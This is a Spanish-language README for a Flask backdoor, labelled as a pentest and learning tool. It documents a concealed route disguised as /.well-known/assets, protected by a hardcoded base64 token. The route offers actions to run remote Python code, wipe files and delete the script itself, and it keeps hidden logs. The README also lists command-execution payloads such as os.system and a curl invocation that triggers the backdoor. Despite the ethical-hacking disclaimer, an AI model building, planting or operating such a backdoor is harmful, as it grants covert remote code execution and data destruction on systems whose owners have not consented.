# 🕵️ Stealth Flask Backdoor

**⚠️ Solo para propósitos de auditoría y aprendizaje en ciberseguridad ética.**

Este microservidor Flask simula una puerta trasera para ejecutar pruebas de penetración y técnicas de evasión en entornos controlados.

## 🚀 Funcionalidades

- Ruta encubierta: `/.well-known/assets`
- Requiere header secreto: `X-Auth-Token: base64("SuperSecret")`
- Acciones:
  - `act=wipe` → borra todos los archivos en `./books`
  - `act=script` → ejecuta código Python remoto
  - `act=selfdestruct` → borra este script
- Logs ocultos en `.syslog`

## 🧪 Payloads útiles

| Payload                             | Descripción                         |
|-------------------------------------|-------------------------------------|
| `print("Hola mundo")`              | Imprime en consola del servidor     |
| `open("flag.txt", "w").write("✅")` | Escribe un archivo en el servidor   |
| `__import__('os').system('ls')`     | Ejecuta un comando de sistema       |
| `__import__('socket').gethostname()`| Obtener el nombre del servidor      |

## 📦 Ejecución

```bash
pip install -r requirements.txt
python backdoor.py
```

Accede desde otro sistema:

```bash
curl -X POST "http://<host>:5000/.well-known/assets?act=script" \
  -H "X-Auth-Token: U3VwZXJTZWNyZXQ=" \
  --data 'print("Backdoor activada")'
```

## ⚠️ Disclaimer

Este código es exclusivamente para **laboratorios éticos de hacking y aprendizaje**. El uso inapropiado en entornos no autorizados es ilegal.

---
